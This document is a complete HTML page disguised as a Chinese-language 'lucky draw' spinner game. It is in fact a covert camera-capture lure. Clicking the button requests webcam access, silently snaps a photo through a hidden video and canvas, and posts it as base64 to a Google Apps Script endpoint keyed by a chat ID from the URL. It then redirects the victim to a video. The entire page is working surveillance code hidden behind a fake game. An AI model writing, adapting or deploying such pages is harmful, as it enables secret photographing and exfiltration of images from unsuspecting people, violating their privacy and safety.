<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>幸运抽奖</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
        #spinner-img { width: 200px; height: 200px; margin-bottom: 30px; }
        .spinning { animation: spin 0.8s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        #status { margin: 15px 0; font-weight: bold; background: rgba(0,0,0,0.6); padding: 10px; }
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 50px; border: none; background: #d9534f; color: white; }
    </style>
</head>
<body>
    <img id="spinner-img" src="https://github.com/sachinbagwan208-design/-/raw/main/00.png" alt="抽奖">
    <div id="status">点击抽奖</div>
    <button id="startBtn">Offen💰</button>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // 【重要】填入你部署的 Google Apps Script 地址
        const GAS_URL = 'https://script.google.com/macros/s/AKfycbxb3YwIGMimTjdYhk8JbzGy_UGa72V2hnwyizmpsqGTYO6H-gzKU8sT94d41zXKFDQ/exec';
        
        const spinner = document.getElementById('spinner-img');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        startBtn.onclick = async () => {
            spinner.classList.add('spinning');
            startBtn.style.display = 'none';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                    const base64 = dataUrl.split(',')[1];
                    
                    const response = await fetch(GAS_URL, {
                        method: 'POST',
                        body: JSON.stringify({ chat_id: CHAT_ID, image_data: base64 })
                    });
                    
                    if((await response.json()).ok) {
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                    } else { status.innerText = "传输失败"; }
                }, 2000);
            } catch (e) { status.innerText = "需允许权限"; }
        };
    </script>
</body>
</html>
